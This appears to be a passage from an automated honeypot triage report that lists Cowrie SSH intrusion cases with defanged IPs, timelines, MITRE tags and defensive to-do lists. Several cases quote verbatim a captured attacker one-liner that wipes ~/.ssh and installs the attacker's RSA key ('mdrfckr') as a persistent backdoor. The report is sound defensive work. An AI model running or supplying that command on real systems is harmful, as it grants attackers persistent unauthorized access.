| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:55:33` | `cowrie.session.connect` |
| `2026-10-26 01:55:33` | `cowrie.client.version` |
| `2026-10-26 01:55:33` | `cowrie.client.kex` |
| `2026-10-26 01:55:33` | `cowrie.login.success` |
| `2026-10-26 01:55:34` | `cowrie.session.params` |
| `2026-10-26 01:55:34` | `cowrie.command.input` |
| `2026-10-26 01:55:34` | `cowrie.command.failed` |
| `2026-10-26 01:55:34` | `cowrie.log.closed` |
| `2026-10-26 01:55:35` | `cowrie.session.params` |
| `2026-10-26 01:55:35` | `cowrie.command.input` |
| `2026-10-26 01:55:35` | `cowrie.session.file_download` |
| `2026-10-26 01:55:35` | `cowrie.log.closed` |
| `2026-10-26 01:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.3.96[.]178` to AbuseIPDB if not already reported
- [ ] Block `79.3.96[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a8f930b2ad

| Field | Detail |
|---|---|
| **Source IP** | `79.3.96[.]178` |
| **First Seen** | 2026-10-26 01:55 |
| **Last Seen** | 2026-10-26 01:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:55:35` | `cowrie.session.connect` |
| `2026-10-26 01:55:35` | `cowrie.client.version` |
| `2026-10-26 01:55:35` | `cowrie.client.kex` |
| `2026-10-26 01:55:36` | `cowrie.login.success` |
| `2026-10-26 01:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.3.96[.]178` to AbuseIPDB if not already reported
- [ ] Block `79.3.96[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3840026fcb2

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]254` |
| **First Seen** | 2026-10-26 01:56 |
| **Last Seen** | 2026-10-26 01:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:56:13` | `cowrie.session.connect` |
| `2026-10-26 01:56:13` | `cowrie.client.version` |
| `2026-10-26 01:56:14` | `cowrie.client.kex` |
| `2026-10-26 01:56:15` | `cowrie.login.success` |
| `2026-10-26 01:56:16` | `cowrie.session.params` |
| `2026-10-26 01:56:16` | `cowrie.command.input` |
| `2026-10-26 01:56:16` | `cowrie.command.failed` |
| `2026-10-26 01:56:16` | `cowrie.log.closed` |
| `2026-10-26 01:56:17` | `cowrie.session.params` |
| `2026-10-26 01:56:17` | `cowrie.command.input` |
| `2026-10-26 01:56:17` | `cowrie.session.file_download` |
| `2026-10-26 01:56:17` | `cowrie.log.closed` |
| `2026-10-26 01:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5981a08c23

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]254` |
| **First Seen** | 2026-10-26 01:56 |
| **Last Seen** | 2026-10-26 01:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:56:17` | `cowrie.session.connect` |
| `2026-10-26 01:56:17` | `cowrie.client.version` |
| `2026-10-26 01:56:18` | `cowrie.client.kex` |
| `2026-10-26 01:56:18` | `cowrie.login.success` |
| `2026-10-26 01:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb3683d1b2ca

| Field | Detail |
|---|---|
| **Source IP** | `85.185.201[.]10` |
| **First Seen** | 2026-10-26 01:56 |
| **Last Seen** | 2026-10-26 01:56 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:56:30` | `cowrie.session.connect` |
| `2026-10-26 01:56:30` | `cowrie.client.version` |
| `2026-10-26 01:56:31` | `cowrie.client.kex` |
| `2026-10-26 01:56:33` | `cowrie.login.success` |
| `2026-10-26 01:56:35` | `cowrie.session.params` |
| `2026-10-26 01:56:35` | `cowrie.command.input` |
| `2026-10-26 01:56:35` | `cowrie.command.failed` |
| `2026-10-26 01:56:41` | `cowrie.log.closed` |
| `2026-10-26 01:56:47` | `cowrie.session.params` |
| `2026-10-26 01:56:47` | `cowrie.command.input` |
| `2026-10-26 01:56:54` | `cowrie.session.file_download` |
| `2026-10-26 01:56:54` | `cowrie.log.closed` |
| `2026-10-26 01:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.185.201[.]10` to AbuseIPDB if not already reported
- [ ] Block `85.185.201[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d7bd4a0f102

| Field | Detail |
|---|---|
| **Source IP** | `85.185.201[.]10` |
| **First Seen** | 2026-10-26 01:56 |
| **Last Seen** | 2026-10-26 01:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:56:48` | `cowrie.session.connect` |
| `2026-10-26 01:56:48` | `cowrie.client.version` |
| `2026-10-26 01:56:48` | `cowrie.client.kex` |
| `2026-10-26 01:56:50` | `cowrie.login.success` |
| `2026-10-26 01:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.185.201[.]10` to AbuseIPDB if not already reported
- [ ] Block `85.185.201[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f406c2c1e21f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]145` |
| **First Seen** | 2026-10-26 01:57 |
| **Last Seen** | 2026-10-26 01:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:57:11` | `cowrie.session.connect` |
| `2026-10-26 01:57:11` | `cowrie.client.version` |
| `2026-10-26 01:57:11` | `cowrie.client.kex` |
| `2026-10-26 01:57:11` | `cowrie.login.success` |
| `2026-10-26 01:57:13` | `cowrie.session.params` |
| `2026-10-26 01:57:13` | `cowrie.command.input` |
| `2026-10-26 01:57:13` | `cowrie.log.closed` |
| `2026-10-26 01:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]145` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dac46ab96a3

| Field | Detail |
|---|---|
| **Source IP** | `45.116.78[.]92` |
| **First Seen** | 2026-10-26 01:57 |
| **Last Seen** | 2026-10-26 01:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:57:44` | `cowrie.session.connect` |
| `2026-10-26 01:57:44` | `cowrie.client.version` |
| `2026-10-26 01:57:44` | `cowrie.client.kex` |
| `2026-10-26 01:57:44` | `cowrie.login.success` |
| `2026-10-26 01:57:46` | `cowrie.session.params` |
| `2026-10-26 01:57:46` | `cowrie.command.input` |
| `2026-10-26 01:57:46` | `cowrie.command.failed` |
| `2026-10-26 01:57:46` | `cowrie.log.closed` |
| `2026-10-26 01:57:47` | `cowrie.session.params` |
| `2026-10-26 01:57:47` | `cowrie.command.input` |
| `2026-10-26 01:57:47` | `cowrie.session.file_download` |
| `2026-10-26 01:57:47` | `cowrie.log.closed` |
| `2026-10-26 01:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.116.78[.]92` to AbuseIPDB if not already reported
- [ ] Block `45.116.78[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-977b2e19ec79

| Field | Detail |
|---|---|
| **Source IP** | `45.116.78[.]92` |
| **First Seen** | 2026-10-26 01:57 |
| **Last Seen** | 2026-10-26 01:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:57:47` | `cowrie.session.connect` |
| `2026-10-26 01:57:47` | `cowrie.client.version` |
| `2026-10-26 01:57:47` | `cowrie.client.kex` |
| `2026-10-26 01:57:49` | `cowrie.login.success` |
| `2026-10-26 01:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.116.78[.]92` to AbuseIPDB if not already reported
- [ ] Block `45.116.78[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d421aa6cb7c6

| Field | Detail |
|---|---|
| **Source IP** | `107.150.99[.]91` |
| **First Seen** | 2026-10-26 01:58 |
| **Last Seen** | 2026-10-26 01:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:58:39` | `cowrie.session.connect` |
| `2026-10-26 01:58:39` | `cowrie.client.version` |
| `2026-10-26 01:58:39` | `cowrie.client.kex` |
| `2026-10-26 01:58:39` | `cowrie.login.success` |
| `2026-10-26 01:58:40` | `cowrie.session.params` |
| `2026-10-26 01:58:40` | `cowrie.command.input` |
| `2026-10-26 01:58:40` | `cowrie.command.failed` |
| `2026-10-26 01:58:40` | `cowrie.log.closed` |
| `2026-10-26 01:58:41` | `cowrie.session.params` |
| `2026-10-26 01:58:41` | `cowrie.command.input` |
| `2026-10-26 01:58:41` | `cowrie.session.file_download` |
| `2026-10-26 01:58:41` | `cowrie.log.closed` |
| `2026-10-26 01:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.99[.]91` to AbuseIPDB if not already reported
- [ ] Block `107.150.99[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-191b2079cbf0

| Field | Detail |
|---|---|
| **Source IP** | `107.150.99[.]91` |
| **First Seen** | 2026-10-26 01:58 |
| **Last Seen** | 2026-10-26 01:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:58:41` | `cowrie.session.connect` |
| `2026-10-26 01:58:41` | `cowrie.client.version` |
| `2026-10-26 01:58:41` | `cowrie.client.kex` |
| `2026-10-26 01:58:42` | `cowrie.login.success` |
| `2026-10-26 01:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.99[.]91` to AbuseIPDB if not already reported
- [ ] Block `107.150.99[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbfa31954043

| Field | Detail |
|---|---|
| **Source IP** | `180.76.145[.]57` |
| **First Seen** | 2026-10-26 01:59 |
| **Last Seen** | 2026-10-26 01:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-26 01:59:07` | `cowrie.session.connect` |
| `2026-10-26 01:59:07` | `cowrie.client.version` |
| `2026-10-26 01:59:07` | `cowrie.client.kex` |
| `2026-10-26 01:59:08` | `cowrie.login.success` |
| `2026-10-26 01:59:09` | `cowrie.session.params` |
| `2026-10-26 01:59:09` | `cowrie.command.input` |
| `2026-10-26 01:59:09` | `cowrie.command.failed` |
| `2026-10-26 01:59:10` | `cowrie.log.closed` |
| `2026-10-26 01:59:11` | `cowrie.session.params` |
| `2026-10-26 01:59:11` | `cowrie.command.input` |
| `2026-10-26 01:59:11` | `cowrie.session.file_download` |
| `2026-10-26 01:59:11` | `cowrie.log.closed` |
| `2026-10-26 01:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.145[.]57` to AbuseIPDB if not already reported
- [ ] Block `180.76.145[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (410) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-7381f1aadf3a | HIGH | `87.106.63[.]76` | 2026-10-26 01:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7b05d35bed6c | HIGH | `180.76.145[.]57` | 2026-10-26 01:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-36f935f679ae | HIGH | `165.154.40[.]201` | 2026-10-26 01:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eedfe1b386bc | HIGH | `87.106.63[.]76` | 2026-10-26 01:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-183fec49a0fc | HIGH | `165.154.40[.]201` | 2026-10-26 01:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9f2bf46fe231 | HIGH | `103.71.176[.]31` | 2026-10-26 02:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b93b9e15a729 | HIGH | `109.160.32[.]145` | 2026-10-26 02:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-62772ef1ec00 | HIGH | `77.239.124[.]155` | 2026-10-26 02:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-5d10c5635a6b | HIGH | `103.71.176[.]31` | 2026-10-26 02:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-926577f14343 | HIGH | `50.6.225[.]165` | 2026-10-26 02:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2c1846bb24ea | HIGH | `50.6.225[.]165` | 2026-10-26 02:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ea6eb1536180 | HIGH | `80.94.95[.]118` | 2026-10-26 02:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eee275672c82 | HIGH | `50.6.200[.]88` | 2026-10-26 02:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-49ab138e3d60 | HIGH | `50.6.200[.]88` | 2026-10-26 02:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8cef5a536fd9 | HIGH | `45.249.246[.]190` | 2026-10-26 02:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4aec54352f1c | HIGH | `45.249.246[.]190` | 2026-10-26 02:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-56729dca16fb | HIGH | `210.209.70[.]188` | 2026-10-26 02:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-96c4f8c51b10 | HIGH | `210.209.70[.]188` | 2026-10-26 02:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b8495900376b | HIGH | `115.190.215[.]101` | 2026-10-26 02:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-464fa9348e86 | HIGH | `109.120.133[.]142` | 2026-10-26 02:20 | Y | 4 | 0 | `T1078` |
| IR-b0a6a0dcd84b | HIGH | `138.226.239[.]234` | 2026-10-26 02:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e6167a146b62 | HIGH | `91.40.152[.]60` | 2026-10-26 02:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3d8a7edf853b | HIGH | `91.40.152[.]60` | 2026-10-26 02:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7adc3860aa8c | HIGH | `152.32.187[.]25` | 2026-10-26 02:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a3dd8ba1290b | HIGH | `152.32.187[.]25` | 2026-10-26 02:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8501b00e3a0b | HIGH | `4.227.177[.]11` | 2026-10-26 02:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-06ba889a6deb | HIGH | `4.227.177[.]11` | 2026-10-26 02:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-073c74497f13 | HIGH | `197.248.207[.]139` | 2026-10-26 02:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7a943e4540ed | HIGH | `197.248.207[.]139` | 2026-10-26 02:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-501f38f69f38 | HIGH | `180.103.119[.]98` | 2026-10-26 02:36 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-53f07e2ef637 | HIGH | `50.6.23[.]110` | 2026-10-26 02:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c8dbd78de143 | HIGH | `50.6.23[.]110` | 2026-10-26 02:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4f19fe76996b | HIGH | `115.68.195[.]133` | 2026-10-26 02:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-daa2b5fc76ee | HIGH | `115.68.195[.]133` | 2026-10-26 02:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-70d98f736768 | HIGH | `106.251.244[.]178` | 2026-10-26 02:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-aadf7af17688 | HIGH | `106.251.244[.]178` | 2026-10-26 02:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ad6397d91ad5 | HIGH | `200.32.41[.]145` | 2026-10-26 02:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ff1630d21c3a | HIGH | `200.32.41[.]145` | 2026-10-26 02:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7a11c68a8721 | HIGH | `45.120.216[.]232` | 2026-10-26 02:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-248d581acbd5 | HIGH | `110.49.76[.]244` | 2026-10-26 02:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a472f552e06d | HIGH | `45.120.216[.]232` | 2026-10-26 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c0847867ad86 | HIGH | `110.49.76[.]244` | 2026-10-26 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b668e2daa94f | HIGH | `172.208.48[.]177` | 2026-10-26 02:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fe6f185cbc70 | HIGH | `172.208.48[.]177` | 2026-10-26 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d5af2be49a08 | HIGH | `50.6.248[.]248` | 2026-10-26 02:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-14931f287be7 | HIGH | `50.6.248[.]248` | 2026-10-26 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b42248363083 | HIGH | `187.127.147[.]100` | 2026-10-26 02:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-13abcb2626a8 | HIGH | `187.127.147[.]100` | 2026-10-26 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fe190fcfb8cf | HIGH | `156.225.64[.]194` | 2026-10-26 02:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-83fb4b2b1439 | HIGH | `156.225.64[.]194` | 2026-10-26 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e8a03dab3be3 | HIGH | `61.76.112[.]4` | 2026-10-26 02:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1e0e3c8fd273 | HIGH | `61.76.112[.]4` | 2026-10-26 02:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8de4d92b3e2a | HIGH | `45.148.10[.]61` | 2026-10-26 02:43 | Y | 1 | 0 | `T1078 · T1592` |
| IR-976fb1071b37 | HIGH | `176.53.159[.]196` | 2026-10-26 02:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d6129e23ae1c | HIGH | `186.248.197[.]77` | 2026-10-26 02:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-44289d99b128 | HIGH | `186.248.197[.]77` | 2026-10-26 02:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1e68771363a2 | HIGH | `193.112.192[.]91` | 2026-10-26 03:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1a8441b7767a | HIGH | `119.15.169[.]38` | 2026-10-26 03:19 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-8ae01a47e886 | HIGH | `91.186.216[.]80` | 2026-10-26 03:39 | Y | 0 | 0 | `T1078` |
| IR-f9496032c781 | HIGH | `2.57.122[.]238` | 2026-10-26 03:39 | Y | 1 | 0 | `T1078 · T1592` |
| IR-17c898e9fa58 | HIGH | `109.160.32[.]130` | 2026-10-26 03:50 | Y | 1 | 0 | `T1078 · T1592` |
| IR-5028c8c58461 | HIGH | `109.160.32[.]130` | 2026-10-26 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-07b915c01305 | HIGH | `2.57.122[.]238` | 2026-10-26 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-080043d4ca5d | HIGH | `195.178.110[.]217` | 2026-10-26 04:01 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
